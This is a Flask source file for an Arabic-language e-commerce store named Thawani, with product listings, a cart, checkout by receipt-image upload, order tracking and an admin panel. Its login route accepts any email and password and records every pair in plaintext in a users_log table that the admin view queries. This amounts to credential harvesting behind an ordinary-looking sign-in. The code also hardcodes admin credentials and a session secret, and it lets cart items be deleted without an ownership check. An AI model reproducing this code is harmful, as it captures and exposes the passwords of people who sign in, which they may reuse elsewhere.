from flask import Flask, request, render_template_string, redirect, session, url_for
import os, sqlite3, uuid, datetime

app = Flask(__name__)
app.secret_key = "thawani_ultra_max_2026_final"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- إعداد قاعدة البيانات الشاملة ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
    c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, location TEXT, 
        card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
        accepted_at TIMESTAMP, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, review_img TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    c.execute("SELECT COUNT(*) FROM categories")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO categories (name) VALUES ('الكل')")
    conn.commit(); conn.close()

init_db()

ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
ADMIN_PASS = "qaws54321"

# --- التنسيق الاحترافي الجديد (CSS Modern UI) ---
CSS = """
<style>
    :root { --main: #10b981; --main-dark: #059669; --bg: #f8fafc; --text: #1e293b; --white: #ffffff; }
    body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--bg); margin: 0; direction: rtl; color: var(--text); padding-bottom: 30px; }
    header { background: var(--white); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 10px rgba(0,0,0,0.05); position: sticky; top:0; z-index:1000; }
    .logo { font-size: 22px; font-weight: 800; color: var(--main); letter-spacing: -1px; text-decoration: none; }
    
    .search-container { padding: 12px 15px; background: var(--white); }
    .search-wrapper { position: relative; display: flex; align-items: center; background: #f1f5f9; border-radius: 12px; padding: 5px 15px; }
    .search-wrapper input { border: none; background: transparent; padding: 10px 5px; width: 100%; outline: none; font-size: 14px; }
    .search-wrapper button { background: none; border: none; cursor: pointer; font-size: 18px; }

    .nav-cats { display: flex; gap: 10px; overflow-x: auto; padding: 15px; scrollbar-width: none; background: var(--bg); }
    .nav-cats::-webkit-scrollbar { display: none; }
    .nav-cats a { background: var(--white); padding: 8px 20px; border-radius: 25px; text-decoration: none; color: #64748b; white-space: nowrap; font-size: 14px; font-weight: 600; transition: 0.3s; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
    .nav-cats a.active { background: var(--main); color: white; }

    .container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 12px; }
    .card { background: var(--white); border-radius: 16px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); transition: 0.2s; border: 1px solid #f1f5f9; }
    .card img { width: 100%; height: 150px; object-fit: cover; }
    .card-info { padding: 10px; }
    .card-info b { font-size: 14px; color: #334155; display: block; margin-bottom: 4px; height: 38px; overflow: hidden; }
    .card-price { color: var(--main-dark); font-weight: 800; font-size: 16px; }
    
    .btn-main { background: var(--main); color: white; border: none; padding: 10px; border-radius: 10px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-weight: 700; width: 100%; margin-top: 8px; transition: 0.2s; font-size: 14px; }
    .btn-main:active { transform: scale(0.98); background: var(--main-dark); }
    
    .admin-badge { position: absolute; top: 8px; left: 8px; background: #ef4444; color: white; padding: 4px; border-radius: 8px; font-size: 12px; z-index: 5; text-decoration:none; }
    
    .track-bg { background: #e2e8f0; height: 8px; border-radius: 10px; position: relative; margin: 30px 0 10px 0; }
    .truck-icon { position: absolute; top: -25px; font-size: 20px; }
    
    input, select, textarea { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 12px; background: white; margin-bottom: 10px; }
</style>
"""

HEADER_HTML = f"""
<!DOCTYPE html>
<html dir='rtl' lang='ar'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    <title>متجر ثواني</title>
    {CSS}
</head>
<body>
"""

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    q = request.args.get('q', '')
    cat = request.args.get('cat', '')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    cats = conn.execute("SELECT * FROM categories").fetchall()
    query = "SELECT * FROM products WHERE 1=1"
    params = []
    if q: 
        query += " AND name LIKE ?"
        params.append(f'%{q}%')
    if cat and cat != 'الكل': 
        query += " AND category = ?"
        params.append(cat)
    prods = conn.execute(query, params).fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header>
        <a href="/" class="logo">THAWANI</a>
        <div style="display:flex; gap:15px; align-items:center;">
            <a href="/orders_history" style="text-decoration:none;">📦</a>
            <a href="/cart" style="text-decoration:none; position:relative;">🛒</a>
            {% if session.get('is_admin') %}<a href="/admin">⚙️</a>{% endif %}
            <a href="/logout" style="text-decoration:none; color:#f43f5e;">❌</a>
        </div>
    </header>
    
    <div class="search-container">
        <form action="/" class="search-wrapper">
            <button type="submit">🔍</button>
            <input type="text" name="q" placeholder="ابحث عن بضاعتك..." value="{{request.args.get('q', '')}}">
        </form>
    </div>

    <div class="nav-cats">
        <a href="/" class="{{ 'active' if not request.args.get('cat') or request.args.get('cat')=='الكل' }}">الكل</a>
        {% for c in cats %}
            <a href="/?cat={{c['name']}}" class="{{ 'active' if request.args.get('cat') == c['name'] }}">{{c['name']}}</a>
        {% endfor %}
    </div>

    <div class="container">
        {% for p in prods %}
        <div class="card" style="position:relative;">
            {% if session.get('is_admin') %}
            <a href="/delete_product/{{p['id']}}" class="admin-badge" onclick="return confirm('حذف؟')">🗑️</a>
            {% endif %}
            <a href="/product/{{p['id']}}"><img src="/static/uploads/{{p['img']}}"></a>
            <div class="card-info">
                <b>{{p['name']}}</b>
                <div class="card-price">{{p['price']}} OMR</div>
                <a href="/product/{{p['id']}}" class="btn-main">اشتري الآن</a>
            </div>
        </div>
        {% endfor %}
    </div>
    """, cats=cats, prods=prods)

# --- بقية الـ Routes مع تعديل بسيط في التصميم البصري ---

@app.route('/product/<int:id>', methods=['GET', 'POST'])
def product(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        f = request.files.get('review_img')
        fname = ""
        if f and f.filename != '': 
            fname = f"{uuid.uuid4().hex}.jpg"
            f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        conn.execute("INSERT INTO reviews (product_id, user_email, rating, comment, review_img) VALUES (?, ?, ?, ?, ?)", 
                     (id, session['user'], request.form['rating'], request.form['comment'], fname))
        conn.commit()
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none; font-size:20px;">🔙</a> <h3 style="margin:0;">تفاصيل المنتج</h3><div></div></header>
    <div style="max-width:600px; margin:auto; padding:15px;">
        <img src="/static/uploads/{{p['img']}}" style="width:100%; border-radius:20px; box-shadow:0 10px 20px rgba(0,0,0,0.05);">
        <h2 style="margin-top:15px;">{{p['name']}}</h2>
        <div class="card-price" style="font-size:24px;">{{p['price']}} OMR</div>
        <form action="/add_to_cart/{{p['id']}}" style="display:flex; gap:10px; margin:20px 0;">
            <input type="number" name="qty" value="1" min="1" style="width:70px; margin-bottom:0;">
            <button class="btn-main" style="margin-top:0;">إضافة للسلة 🛒</button>
        </form>
        <hr style="border:0; border-top:1px solid #eee;">
        <h3>⭐ التقييمات</h3>
        <form method="POST" enctype="multipart/form-data" style="background:#f1f5f9; padding:15px; border-radius:15px;">
            <select name="rating">
                <option value="5">⭐⭐⭐⭐⭐ ممتاز</option>
                <option value="4">⭐⭐⭐⭐ جيد جداً</option>
                <option value="3">⭐⭐⭐ عادي</option>
            </select>
            <textarea name="comment" placeholder="رأيك يهمنا..." required rows="2"></textarea>
            <input type="file" name="review_img">
            <button class="btn-main" style="background:#334155;">نشر التقييم</button>
        </form>
        {% for r in revs %}
        <div style="border-bottom:1px solid #f1f5f9; padding:15px 0;">
            <div style="display:flex; justify-content:space-between; font-size:12px;">
                <b>{{r['user_email'].split('@')[0]}}</b>
                <span>{{'⭐'*r['rating']}}</span>
            </div>
            <p style="margin:5px 0; font-size:14px;">{{r['comment']}}</p>
            {% if r['review_img'] %}<img src="/static/uploads/{{r['review_img']}}" style="width:100px; border-radius:10px; margin-top:5px;">{% endif %}
        </div>
        {% endfor %}
    </div>""", p=p, revs=revs)

@app.route('/delete_product/<int:id>')
def delete_product(id):
    if session.get('is_admin'):
        conn = sqlite3.connect('database.db')
        conn.execute("DELETE FROM products WHERE id=?", (id,))
        conn.commit(); conn.close()
    return redirect('/')

@app.route('/add_to_cart/<int:id>')
def add_to_cart(id):
    qty = request.args.get('qty', 1, type=int)
    conn = sqlite3.connect('database.db')
    cur = conn.execute("SELECT id FROM cart WHERE user_email=? AND product_id=?", (session['user'], id)).fetchone()
    if cur: conn.execute("UPDATE cart SET quantity = quantity + ? WHERE id=?", (qty, cur[0]))
    else: conn.execute("INSERT INTO cart (user_email, product_id, quantity) VALUES (?, ?, ?)", (session['user'], id, qty))
    conn.commit(); conn.close()
    return redirect('/cart')

@app.route('/cart')
def cart():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.args.get('action') == 'delete':
        conn.execute("DELETE FROM cart WHERE id=?", (request.args.get('id'),))
        conn.commit()
    items = conn.execute('SELECT cart.id, products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none; font-size:20px;">🔙</a> <h3 style="margin:0;">السلة</h3><div></div></header>
    <div style="padding:15px; max-width:600px; margin:auto;">
        {% for i in items %}
        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border:1px solid #f1f5f9;">
            <div><b style="font-size:14px;">{{i['name']}}</b><br><small style="color:#64748b;">{{i['quantity']}} × {{i['price']}} OMR</small></div>
            <div style="display:flex; align-items:center; gap:10px;">
                <b class="card-price">{{ i['price'] * i['quantity'] }} OMR</b>
                <a href="/cart?action=delete&id={{i['id']}}" style="text-decoration:none;">🗑️</a>
            </div>
        </div>
        {% endfor %}
        {% if items %}
        <div style="background:white; padding:20px; border-radius:20px; margin-top:20px; text-align:center; border:1.5px solid var(--main);">
            <div style="font-size:20px; font-weight:800;">الإجمالي: {{total}} OMR</div>
            <a href="/checkout" class="btn-main" style="margin-top:15px; padding:15px;">إتمام الشراء 💳</a>
        </div>
        {% else %}
        <div style="text-align:center; padding:80px 20px;"><h3>سلتك فارغة</h3><a href="/" class="btn-main">تسوّق الآن</a></div>
        {% endif %}
    </div>""", items=items, total=total)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, cart.quantity, products.price FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    if not items: return redirect('/')
    total = sum(i['price'] * i['quantity'] for i in items)
    if request.method == 'POST':
        details = ", ".join([f"{i['name']} ({i['quantity']})" for i in items])
        f = request.files['card_img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        conn.execute("INSERT INTO orders (user_email, full_name, phone, location, card_img, items_details, total_price) VALUES (?,?,?,?,?,?,?)",
                     (session['user'], request.form['full_name'], request.form['phone'], request.form['location'], fname, details, total))
        conn.execute("DELETE FROM cart WHERE user_email=?", (session['user'],))
        conn.commit(); conn.close()
        return redirect('/orders_history')
    return render_template_string(HEADER_HTML + """
    <header><a href="/cart" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">تأكيد الدفع</h3><div></div></header>
    <div style="padding:20px; max-width:500px; margin:auto;">
        <form method="POST" enctype="multipart/form-data">
            <input name="full_name" placeholder="الاسم الثلاثي" required>
            <input name="phone" placeholder="رقم الواتساب" required>
            <textarea name="location" placeholder="العنوان بالتفصيل" required rows="3"></textarea>
            <div style="background:#fef3c7; padding:15px; border-radius:12px; margin:10px 0; font-size:13px; color:#92400e;">
                قم بإرفاق صورة إيصال التحويل لإكمال العملية.
            </div>
            <input type="file" name="card_img" required>
            <button class="btn-main" style="margin-top:15px; padding:15px;">إرسال الطلب ✅</button>
        </form>
    </div>""")

@app.route('/orders_history')
def orders_history():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    ords = conn.execute("SELECT * FROM orders WHERE user_email=? ORDER BY id DESC", (session['user'],)).fetchall(); conn.close()
    
    def get_progress(accepted_date):
        if not accepted_date: return 0
        try:
            start = datetime.datetime.strptime(accepted_date, '%Y-%m-%d %H:%M:%S')
            now = datetime.datetime.now()
            diff = (now - start).total_seconds()
            perc = (diff / (7 * 24 * 60 * 60)) * 100
            return min(max(perc, 0), 100)
        except: return 0

    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">طلباتي</h3><div></div></header>
    <div style="padding:15px; max-width:600px; margin:auto;">
        {% for o in ords %}
        <div style="background:white; padding:15px; margin-bottom:15px; border-radius:15px; border:1px solid #f1f5f9;">
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <span style="font-size:12px; color:#64748b;">#{{o['id']}}</span>
                <span style="font-size:12px; font-weight:bold; padding:4px 10px; border-radius:10px; 
                background:{{'#dcfce7' if o['status']=='تم القبول' else '#fee2e2' if o['status']=='تم الرفض' else '#fef3c7'}}; 
                color:{{'#166534' if o['status']=='تم القبول' else '#991b1b' if o['status']=='تم الرفض' else '#92400e'}};">
                {{o['status']}}</span>
            </div>
            {% if o['status'] == 'تم القبول' %}
            <div class="track-bg"><div class="truck-icon" style="right: {{ get_progress(o['accepted_at']) }}%;">🚚</div></div>
            {% endif %}
            <div style="font-size:14px;">{{o['items_details']}}</div>
            <div style="font-weight:bold; color:var(--main-dark); margin-top:5px;">{{o['total_price']}} OMR</div>
        </div>
        {% endfor %}
    </div>""", ords=ords, get_progress=get_progress)

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('is_admin'): return redirect('/')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        if 'add_product' in request.form:
            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
            conn.execute("INSERT INTO products (name, price, img, category) VALUES (?,?,?,?)", (request.form['name'], request.form['price'], fname, request.form['cat']))
        elif 'add_cat' in request.form:
            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
        conn.commit()
    
    action = request.args.get('action'); oid = request.args.get('id')
    if action and oid:
        if action == 'accept':
            now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            conn.execute("UPDATE orders SET status='تم القبول', accepted_at=? WHERE id=?", (now, oid))
        elif action == 'reject':
            conn.execute("UPDATE orders SET status='تم الرفض' WHERE id=?", (oid,))
        conn.commit()

    cats = conn.execute("SELECT * FROM categories").fetchall()
    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><h3>لوحة التحكم</h3><a href="/" style="text-decoration:none;">إغلاق</a></header>
    <div style="padding:15px;">
        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:20px;">
            <h4>إضافة قسم</h4>
            <form method="POST" style="display:flex; gap:10px;">
                <input name="cat_name" placeholder="اسم القسم" required style="margin-bottom:0;">
                <button name="add_cat" class="btn-main" style="width:100px; margin-top:0;">حفظ</button>
            </form>
        </div>
        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:20px;">
            <h4>إضافة منتج</h4>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="اسم المنتج" required>
                <input name="price" placeholder="السعر" required>
                <select name="cat">{% for c in cats %}<option value="{{c['name']}}">{{c['name']}}</option>{% endfor %}</select>
                <input type="file" name="img" required>
                <button name="add_product" class="btn-main">إضافة للمتجر</button>
            </form>
        </div>
        <h4>الطلبات</h4>
        {% for o in orders %}
        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:10px; border:1px solid #ddd;">
            <b>{{o['full_name']}}</b> ({{o['phone']}})<br>
            <small>{{o['items_details']}}</small><br>
            <div style="margin-top:10px;">
                <a href="/admin?action=accept&id={{o['id']}}" style="color:green; text-decoration:none; font-weight:bold;">قبول ✅</a>
                <a href="/admin?action=reject&id={{o['id']}}" style="color:red; text-decoration:none; font-weight:bold; margin-right:15px;">رفض ❌</a>
            </div>
            <img src="/static/uploads/{{o['card_img']}}" style="width:80px; margin-top:10px; border-radius:8px;">
        </div>
        {% endfor %}
    </div>""", cats=cats, orders=orders, logs=logs)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email, password = request.form['email'], request.form['password']
        conn = sqlite3.connect('database.db'); conn.execute("INSERT INTO users_log (email, password) VALUES (?, ?)", (email, password)); conn.commit(); conn.close()
        session['user'], session['is_admin'] = email, (email == ADMIN_MAIL and password == ADMIN_PASS)
        return redirect('/')
    return render_template_string(HEADER_HTML + """
    <div style="display:flex; justify-content:center; align-items:center; min-height:90vh; padding:20px;">
        <div style='background:white; padding:30px; border-radius:30px; box-shadow:0 10px 40px rgba(0,0,0,0.05); width:100%; max-width:400px; text-align:center;'>
            <h1 class="logo" style="font-size:35px; margin-bottom:10px;">THAWANI</h1>
            <p style="color:#64748b; margin-bottom:30px;">أهلاً بك في متجرك المفضل</p>
            <form method='POST'>
                <input type="email" name='email' placeholder='البريد الإلكتروني' required>
                <input type='password' name='password' placeholder='كلمة المرور' required>
                <button class='btn-main' style="padding:15px; font-size:16px;">دخول آمن</button>
            </form>
        </div>
    </div>""")

@app.route('/logout')
def logout():
    session.clear(); return redirect('/login')

application = app
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
